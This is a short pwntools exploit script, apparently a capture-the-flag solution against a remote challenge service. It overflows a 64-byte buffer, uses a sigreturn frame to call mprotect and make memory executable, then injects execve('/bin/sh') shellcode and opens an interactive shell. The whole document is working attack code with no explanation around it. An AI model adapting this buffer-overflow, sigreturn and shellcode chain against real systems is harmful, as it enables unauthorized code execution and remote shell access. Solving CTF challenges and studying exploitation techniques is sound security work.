from pwn import *

shellcode = """
mov al, 0x3b
xor rsi, rsi
xor rdx, rdx
mov rcx, 0x0068732f6e69622f
push rcx
push rsp
pop rdi
syscall
"""
context.arch = "amd64"
r = remote("microp.ctfz.one" ,2228)
#r = process("./vuln")
start = 0x401000
syscall = 0x401058              # syscall; ret
read = 0x401044                 # to call read
fun_ptr = 0x400090              # which has start's address
frame = SigreturnFrame()        # Frame for mprotect(0x400000,0x1000,0x7)
frame.rax = 0xa                 # syscall number
frame.rdi = 0x400000            # starting address
frame.rsi = 0x1000              # size
frame.rdx = 0x7                 # prot no 0x7 for rwx permission
frame.rip = syscall
frame.rsp = fun_ptr
frame = bytes(frame)
exploit = b"A" * 64 + p64(read) + p64(syscall)
exploit += frame
r.send(exploit)
sleep(2)
r.send(b"A" * 15)               # To make rax = 0xf for triggering sigreturn syscall.
sleep(2)
payload = b"A" * 64 + p64(fun_ptr + 0x8) + asm(shellcode)
r.send(payload)
r.interactive()
